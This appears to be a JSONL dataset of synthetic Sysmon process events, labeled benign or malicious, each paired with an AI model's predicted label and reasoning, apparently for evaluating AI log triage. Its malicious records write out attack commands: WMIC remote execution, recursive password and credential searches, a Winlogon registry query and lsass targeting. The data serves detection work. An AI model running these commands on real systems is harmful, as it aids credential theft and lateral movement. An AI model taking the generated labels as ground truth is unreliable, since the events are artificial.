PowerShell connection to TARGET-PC, indicating potential lateral movement. The parent process being explorer.exe with NETWORK SERVICE context is highly suspicious.", "confidence": "high", "attack_technique": "lateral_movement"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:22", "UtcTime": "2020-05-01T22:56:22.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c wmic /node:DESKTOP-TARGET process call create \"powershell.exe -Command \\\"Write-Host 'Hello from remote' > C:\\temp\\hello.txt\\\"\"", "ProcessId": "2148", "ProcessGUID": "{6bbf237a-0864-5eac-0864-000000000864}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1564", "ParentProcessGUID": "{6bbf237a-061c-5eac-061c-00000000061c}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:22] | PID=2148 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c wmic /node:DESKTOP-TARGET process call create \"powershell.exe -Command \\\"Write-Host 'Hello from remote' > C:\\temp\\hello.txt\\\"\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "WMIC used for remote process execution to spawn PowerShell on another machine (DESKTOP-TARGET), which is a classic lateral movement technique even though the payload appears benign.", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 1, "EventTime": "2025-10-10 08:04:20", "UtcTime": "2025-10-10T08:04:20.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -Command Get-Process", "ProcessId": "2014", "ProcessGUID": "{12345678-1234-5678-1234-567812340018}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "2000", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340000}", "ParentCommandLine": "cmd.exe", "User": "WORKSTATION\\user", "Domain": "WORKSTATION", "AccountName": "user", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\user", "LogonId": "0x1234", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:20] | PID=2014 | User=WORKSTATION\\user | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=powershell.exe -ExecutionPolicy Bypass -Command Get-Process", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "PowerShell executing Get-Process command to list running processes - a standard administrative task with no malicious indicators. The ExecutionPolicy Bypass is commonly used for legitimate scripting.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:58:00", "UtcTime": "2020-05-01T22:58:00.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\findstr.exe", "CommandLine": "findstr /i /n \"credentials\" C:\\ProgramData\\victim\\log.txt", "ProcessId": "1311", "ProcessGUID": "{6bbf237a-051f-5eac-051f-00000000051f}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1300", "ParentProcessGUID": "{6bbf237a-0514-5eac-0514-000000000514}", "ParentCommandLine": "cmd.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:58:00] | PID=1311 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\findstr.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=findstr /i /n \"credentials\" C:\\ProgramData\\victim\\log.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using findstr to search for \"credentials\" in a file located in ProgramData\\victim directory - indicates credential discovery activity targeting staged data.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:00", "UtcTime": "2020-05-01T22:57:00.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ProcessId": "1267", "ProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1256", "ParentProcessGUID": "{6bbf237a-04e8-5eac-04e8-0000000004e8}", "ParentCommandLine": "cmd.exe /c findstr /si password C:\\Users\\Public\\Documents\\*.xml C:\\ProgramData\\*.config", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:00] | PID=1267 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\reg.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "NETWORK SERVICE account querying Winlogon registry keys, which contain sensitive authentication credentials and auto-logon information. This is a credential discovery technique often used by attackers to extract stored passwords.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:00", "UtcTime": "2025-10-10T08:03:00.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "CommandLine": "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"", "ProcessId": "1901", "ProcessGUID": "{6c0d2266-e4fa-3d99-1f00-000000001300}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Program Files\\Mozilla Firefox\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:00] | PID=1901 | User=CORP\\jsmith | Image=C:\\Program Files\\Mozilla Firefox\\firefox.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Firefox browser launched by Windows Explorer under a normal user account - standard desktop application usage with expected parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-09 15:36:10", "UtcTime": "2025-10-09T15:36:10.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Chrome\\chrome.exe", "ProcessId": "5623", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000402}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "54321", "DestinationIp": "8.8.8.8", "DestinationPort": "53", "DestinationHostname": "dns.google", "Protocol": "UDP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-09 15:36:10] | PID=5623 | User=CORP\\jsmith | Image=C:\\Program Files\\Chrome\\chrome.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Chrome browser execution by a domain user - standard web browsing activity with no suspicious command-line arguments or unusual context.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:00", "UtcTime": "2025-10-10T08:00:00.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c echo Hello", "ProcessId": "2000", "ProcessGUID": "{12345678-1234-5678-1234-567812340000}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1000", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340001}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\user", "Domain": "WORKSTATION", "AccountName": "user", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\user", "LogonId": "0x1234", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:00] | PID=2000 | User=WORKSTATION\\user | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c echo Hello", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing a simple echo command via cmd.exe spawned from explorer.exe - typical benign user activity with no suspicious indicators.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:40", "UtcTime": "2020-05-01T22:56:40.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\findstr.exe", "CommandLine": "findstr /spin \"password\" *.*", "ProcessId": "1238", "ProcessGUID": "{6bbf237a-04d6-5eac-04d6-0000000004d6}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1237", "ParentProcessGUID": "{6bbf237a-04d5-5eac-04d5-0000000004d5}", "ParentCommandLine": "dir /s /b *password*.txt", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\pbeesly\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:40] | PID=1238 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\findstr.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=findstr /spin \"password\" *.*", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using findstr to recursively search all files for the string \"password\" is a credential discovery technique commonly used by attackers to locate stored passwords in configuration files, scripts, or documents.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 11, "EventTime": "2025-10-10 08:03:20", "UtcTime": "2025-10-10T08:03:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "9012", "ProcessGUID": "{4577e2b7-2ba9-5ebc-1000-000000001300}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Wireshark\\Wireshark.exe", "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\wireshark_example.pcapng", "CreationUtcTime": "2025-10-10T08:03:20.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:20] | PID=9012 | User=CORP\\jsmith | Image=C:\\Program Files\\Wireshark\\Wireshark.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Wireshark network analyzer launched by domain user jsmith - legitimate network troubleshooting tool being used in normal manner without suspicious command-line arguments.", "confidence": "high", "attack_technique": ""}}
{"EventID": 11, "EventTime": "2025-10-09 15:36:20", "UtcTime": "2025-10-09T15:36:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "6734", "ProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000403}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Windows\\System32\\notepad.exe", "TargetFilename": "C:\\Users\\jsmith\\Documents\\notes.txt", "CreationUtcTime": "2025-10-09T15:36:20.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-09 15:36:20] | PID=6734 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\notepad.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User jsmith launching notepad.exe from its legitimate Windows System32 location - standard desktop application usage with no suspicious parameters or context.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:50", "UtcTime": "2025-10-10T08:03:50.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\msiexec.exe", "CommandLine": "msiexec.exe /i C:\\Users\\jsmith\\Downloads\\installer.msi", "ProcessId": "2234", "ProcessGUID": "{9f305599-112d-6e2c-2200-000000001600}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Downloads\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:50] | PID=2234 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\msiexec.exe | Parent=C:\\Windows\\explorer.exe | CMD=msiexec.exe /i C:\\Users\\jsmith\\Downloads\\installer.msi", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing MSI installer from Downloads folder via Windows Installer (msiexec.exe) launched from explorer.exe - standard software installation activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:02:20", "UtcTime": "2025-10-10T08:02:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE", "CommandLine": "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE C:\\Users\\jsmith\\Documents\\Spreadsheet.xlsx", "ProcessId": "6789", "ProcessGUID": "{01339e83-1769-5eb8-1000-000000000f00}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5ead-1000-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Documents\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:20] | PID=6789 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE | Parent=C:\\Windows\\explorer.exe | CMD=C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE C:\\Users\\jsmith\\Documents\\Spreadsheet.xlsx", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User opening an Excel spreadsheet from their Documents folder via Windows Explorer - standard office productivity activity with normal parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:01:30", "UtcTime": "2025-10-10T08:01:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\taskhostw.exe", "CommandLine": "taskhostw.exe", "ProcessId": "1234", "ProcessGUID": "{f478afef-8e94-d733-1900-000000000d00}", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentProcessId": "1345", "ParentProcessGUID": "{0589bb00-0000-0000-0000-000000000000}", "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "System", "CurrentDirectory": "C:\\Windows\\system32\\", "LogonId": "0x3e4", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:01:30] | PID=1234 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\taskhostw.exe | Parent=C:\\Windows\\System32\\svchost.exe | CMD=taskhostw.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Taskhostw.exe running as SYSTEM with svchost.exe as parent is normal Windows task scheduling behavior. This is a legitimate Windows component executing scheduled tasks.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:24", "UtcTime": "2020-05-01T22:57:24.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell -command Get-Process lsass | Out-File C:\\Users\\Public\\lsass.txt", "ProcessId": "1028", "ProcessGUID": "{6bbf237a-0404-5eac-0404-000000000404}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "420", "ParentProcessGUID": "{6bbf237a-01a4-5eac-01a4-0000000001a4}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "memory_credential_dumping", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:24] | PID=1028 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Parent=C:\\Windows\\explorer.exe | CMD=powershell -command Get-Process lsass | Out-File C:\\Users\\Public\\lsass.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "PowerShell targeting lsass process (credential storage) and outputting to public directory - classic credential discovery pattern. Unusual parent-child relationship (explorer.exe spawning PowerShell as NETWORK SERVICE) indicates potential privilege abuse.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:35", "UtcTime": "2020-05-01T22:56:35.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "dir /s /b *password*.txt", "ProcessId": "1267", "ProcessGUID": "{6bbf237a-04f3-5eac-04f3-0000000004f3}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "456", "ParentProcessGUID": "{6bbf237a-01c8-5eac-01c8-0000000001c8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:35] | PID=1267 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=dir /s /b *password*.txt", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Command searches entire directory tree for files containing 'password' in the filename - clear credential discovery attempt to locate stored passwords.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2025-10-10 08:04:30", "UtcTime": "2025-10-10T08:04:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\7-Zip\\7zFM.exe", "CommandLine": "\"C:\\Program Files\\7-Zip\\7zFM.exe\"", "ProcessId": "2456", "ProcessGUID": "{c15277bb-334f-8e4e-2400-000000001800}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Program Files\\7-Zip\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:30] | PID=2456 | User=CORP\\jsmith | Image=C:\\Program Files\\7-Zip\\7zFM.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\7-Zip\\7zFM.exe\"", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User launching 7-Zip file manager GUI from Windows Explorer - standard file compression/extraction activity with normal parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
